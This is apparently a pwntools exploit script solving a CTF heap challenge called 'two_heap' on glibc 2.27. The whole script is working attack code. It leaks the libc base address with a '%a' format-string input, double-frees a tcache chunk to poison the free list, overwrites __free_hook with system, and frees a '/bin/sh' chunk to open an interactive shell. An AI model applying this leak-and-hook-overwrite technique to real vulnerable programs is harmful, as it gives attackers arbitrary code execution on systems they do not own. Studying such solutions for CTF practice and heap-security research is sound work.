from pwn import *
argv=["/glibc/x64/2.27/lib/ld-2.27.so","--library-path","/glibc/x64/2.27/lib/","./two_heap"]
a=process(argv=argv)
libc=ELF("/glibc/x64/2.27/lib/libc-2.27.so")
context.terminal=["tmux","splitw","-h"]
def debug():
    gdb.attach(a,'''
    b *(0x7ffff7ff2000+0x000000000001174)
    b *(0x7ffff7ff2000+0x000000000001578)
    b *(0x7ffff7ff2000+0x000000000001604)
    ''')
def menu(idx):
    a.recvuntil("choice:")
    a.sendline(str(idx))
def add(size,content):
    menu(1)
    a.recvuntil("Input the size:\n")
    a.sendline(str(size))
    a.recvuntil("Input the note:\n")
    a.send(content)
def delete(idx):
    menu(2)
    a.recvuntil("Input the index:\n")
    a.sendline(str(idx))
# 1  -  0x18
#debug()
a.sendlineafter("SCTF:\n","%a%a%a%a%a")
a.recvuntil("0x0.0")
libc_base = int(a.recv(11), 16)*0x10-0x174000
success("libc_base ==> 0x%x"%libc_base)
add(1,"")
delete(0)
delete(0)
add(8,p64(libc_base+libc.symbols["__free_hook"]))
add(0x10,'/bin/sh\x00\n')
add(0x18,p64(libc.symbols["system"]+libc_base)+'\n')

a.interactive()